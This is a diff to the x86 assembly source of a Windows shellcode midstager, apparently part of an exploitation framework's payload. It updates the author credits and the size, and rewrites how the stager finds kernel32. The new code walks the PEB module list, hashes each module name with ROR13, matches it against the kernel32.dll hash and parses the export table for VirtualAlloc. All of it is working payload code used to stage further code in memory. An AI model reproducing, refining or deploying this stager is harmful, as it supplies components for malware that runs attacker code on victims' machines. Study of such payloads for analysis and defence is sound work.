@@ -4,9 +4,9 @@
 ;
 ; Source for the windows midstager
 ;
-; Origional Authors: ?
-; This patch: Stephen Fewer <info@harmonysecurity.com>
-; Size: 191
+; Original Author: Matt Miller <mmiller[at]hick.org>
+; Updated Kernel32: Stephen Fewer <info@harmonysecurity.com>
+; Size: 222
 ;
 ; This midstager performs the following actions...
 ;
@@ -30,6 +30,7 @@ global _start
 _start:
 	cld
 	xor ebx, ebx
+  
 	mov eax, [fs:ebx+0x30]
 	mov eax, [eax+0xc]
 	mov edx, [eax+0x1C]
@@ -49,11 +50,32 @@ _start:
 	mov esi, [ecx+0x3C]
 	add esi, ebp
 	pushad
-	mov eax, [fs:0x30] ; parse the kernels export table for VirtualAlloc
-	mov eax, [eax+0xc]
-	mov esi, [eax+0x1C]
-	lodsd
-	mov ebp, [eax+0x8]
+	
+	; parse the kernels export table for VirtualAlloc...
+
+	mov ebx, [fs:ebx+0x30] ; get a pointer to the PEB
+	mov ebx, [ebx+0x0C]    ; get PEB->Ldr
+	mov ebx, [ebx+0x14]    ; get PEB->Ldr.InMemoryOrderModuleList.Flink
+next_mod:
+	mov esi, [ebx+0x28]    ; get pointer to modules name (unicode string)
+	push byte 24           ; push down the length we want to check
+	pop ecx                ; set ecx to this length for the loop
+	xor edi, edi           ; clear edi which will store the hash of the module name
+loop_modname:
+	xor eax, eax           ; clear eax
+	lodsb                  ; read in the next byte of the name
+	cmp al, 'a'            ; some versions of Windows use lower case module names
+	jl not_lowercase       ; 
+	sub al, 0x20           ; if so normalise to uppercase
+not_lowercase:             ; 
+	ror edi, 13            ; rotate left our hash value
+	add edi, eax           ; add the next byte of the name
+	loop loop_modname      ; loop untill we have read enough
+	cmp edi, 0x6A4ABC5B    ; compare the hash with that of kernel32.dll
+	mov ebp, [ebx+0x10]    ; get this modules base address
+	mov ebx, [ebx]         ; get the next module
+	jne next_mod           ; if it doesnt match, process the next module
+	
 	mov eax, [ebp+0x3C]
 	mov edi, [ebp+eax+0x78]
 	add edi, ebp
